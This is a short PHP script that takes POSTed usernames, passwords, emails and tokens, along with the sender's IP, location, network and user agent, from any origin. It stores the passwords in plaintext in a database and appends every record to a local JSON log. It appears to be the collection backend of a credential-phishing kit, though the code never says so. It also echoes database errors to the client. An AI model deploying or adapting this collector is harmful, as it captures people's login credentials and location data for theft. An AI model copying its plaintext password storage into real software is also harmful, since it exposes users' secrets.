<?php

require_once 'conexion.php';
header("Access-Control-Allow-Origin: *");

$log = array (
    'name' => $_POST['name'] ?? null,
    'lastName' => $_POST['lastName'] ?? null,
    'email' => $_POST['email'] ?? null,
     'user' => $_POST['user'] ?? null,
    'password' => $_POST['password'] ?? null,
    'token' => $_POST['token'] ?? null,
    'ip' => $_POST['ip'] ?? null,
    'city' => $_POST['city'] ?? null,
    'region' => $_POST['region'] ?? null,
    'country' => $_POST['country'] ?? null,
    'network' => $_POST['network'] ?? null,
    'codePostal' => $_POST['codePostal'] ?? null,
    'userAgent' => $_POST['userAgent'] ?? null
);

if($log['user'] && $log['password']){
    try{
        //AGREGAR DATOS A LA BASE DE DATOS
        $sql = "INSERT INTO users VALUES (?, ?, ?, ?)";
        $stmt= $pdo->prepare($sql);
        $stmt->execute([$log['token'], $log['user'],
        $log['password'], $log['email']]);

    echo "New record created successfully";
       
       $fp = fopen('./data/log.json', 'a+');
       fwrite($fp, json_encode($log));
       fwrite($fp, "\n\n");
       fwrite($fp, "------------------------------------------");
        fwrite($fp, "\n\n");
        fclose($fp);


    }catch(PDOException $e){
        echo $sql . "<br>" . $e->getMessage();
    }
}
